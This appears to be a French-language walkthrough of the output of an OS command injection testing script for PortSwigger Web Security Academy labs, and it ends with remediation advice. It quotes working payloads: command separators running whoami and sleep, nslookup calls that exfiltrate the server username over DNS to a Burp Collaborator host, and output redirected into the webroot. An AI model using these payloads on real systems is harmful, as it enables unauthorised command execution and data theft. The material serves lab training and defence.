# MANPAGE

Voici un **exemple exhaustif de l’exécution du script OS Command Injection PortSwigger**, illustrant chaque étape, le comportement attendu, et la logique de contrôle, en s’appuyant sur les scénarios et techniques recommandés par PortSwigger[1][2][4][5][8].

---

### 1. Test d'injection OS (commande visible dans la réponse)

```
------------------------------------------------------
[1] Test d'injection OS (commande visible dans la réponse)
  [+] Commande exécutée avec séparateur ';' !
www-data
```
*Le script envoie des payloads comme `1;whoami` dans `productId`. La réponse contient le nom d’utilisateur du serveur (`www-data`, `root`, etc.), confirmant une injection directe classique, comme attendu dans les labs simples[2][4][5].*

---

### 2. Test d'injection aveugle par timing

```
------------------------------------------------------
[2] Test d'injection aveugle par timing
  [+] Injection aveugle détectée par délai avec ';' (délai 5 s) !
```
*Le script envoie un payload comme `1;sleep 5` et mesure le temps de réponse. Un délai significatif (ici 5 secondes) indique une vulnérabilité d’injection aveugle, typique des labs blind OS injection[1][6].*

---

### 3. Test d'injection out-of-band (OAST/DNS exfiltration)

```
------------------------------------------------------
[3] Test d'injection out-of-band (OAST/DNS exfiltration)
  [Info] Vérifiez sur Burp Collaborator ou votre serveur DNS si une requête test.your-collaborator-id.burpcollaborator.net a été reçue.
  [Info] Vérifiez sur Burp Collaborator ou votre serveur DNS si une requête test.your-collaborator-id.burpcollaborator.net a été reçue.
  [Info] Vérifiez sur Burp Collaborator ou votre serveur DNS si une requête test.your-collaborator-id.burpcollaborator.net a été reçue.
  [Info] Vérifiez sur Burp Collaborator ou votre serveur DNS si une requête test.your-collaborator-id.burpcollaborator.net a été reçue.
```
*Le script injecte des commandes comme `1;nslookup test.<OAST_DOMAIN>`. Si une requête DNS est reçue sur Burp Collaborator, cela confirme une injection out-of-band, vue dans les labs avancés PortSwigger[1][8].*

---

### 4. Exfiltration de données via OAST (whoami dans DNS)

```
------------------------------------------------------
[4] Exfiltration de données via OAST (whoami dans DNS)
  [Info] Vérifiez sur Burp Collaborator si une requête <user>.your-collaborator-id.burpcollaborator.net a été vue (le nom d'utilisateur du serveur).
  [Info] Vérifiez sur Burp Collaborator si une requête <user>.your-collaborator-id.burpcollaborator.net a été vue (le nom d'utilisateur du serveur).
  [Info] Vérifiez sur Burp Collaborator si une requête <user>.your-collaborator-id.burpcollaborator.net a été vue (le nom d'utilisateur du serveur).
  [Info] Vérifiez sur Burp Collaborator si une requête <user>.your-collaborator-id.burpcollaborator.net a été vue (le nom d'utilisateur du serveur).
```
*Le script injecte `1;nslookup \`whoami\`.OAST_DOMAIN` pour exfiltrer la sortie de `whoami` via DNS. Si Burp Collaborator reçoit une requête de type `www-data.OAST_DOMAIN`, l’exfiltration est réussie[8].*

---

### 5. Exfiltration de données via fichier dans le webroot

```
------------------------------------------------------
[5] Exfiltration de données via fichier dans le webroot
  [+] Fichier exfiltré trouvé à https://<your-lab>.web-security-academy.net/whoami.txt :
www-data
```
*Le script injecte `1;whoami > /var/www/html/whoami.txt` puis tente de récupérer le fichier. Si le contenu du fichier (`www-data`, etc.) est accessible, l’exfiltration par redirection de sortie est confirmée, comme dans les labs PortSwigger[1][8].*

---

### 6. Conseils/remédiation

```
------------------------------------------------------
[Remédiation & Conseils]
- Ne jamais concaténer d'entrée utilisateur dans des commandes système.
- Utilisez des API système sécurisées (ex: execve, pas system/sh).
- Filtrez et validez strictement toutes les entrées utilisateur.
- Pour les labs PortSwigger, testez tous les séparateurs et vecteurs (timing, OAST, redirection, etc.).
- Documentation PortSwigger : https://portswigger.net/web-security/os-command-injection
```
*Le script rappelle les bonnes pratiques de sécurisation recommandées par PortSwigger[1].*

---

### 7. Synthèse

```
------------------------------------------------------
[SYNTHÈSE]
1. Injection directe (commande dans la réponse).
2. Injection aveugle (timing/sleep).
3. Injection out-of-band (OAST/DNS).
4. Exfiltration de données (DNS, fichier webroot).
5. Contrôle automatisé ou semi-automatisé de la réponse.
6. Conseils de remédiation PortSwigger.
------------------------------------------------------
```
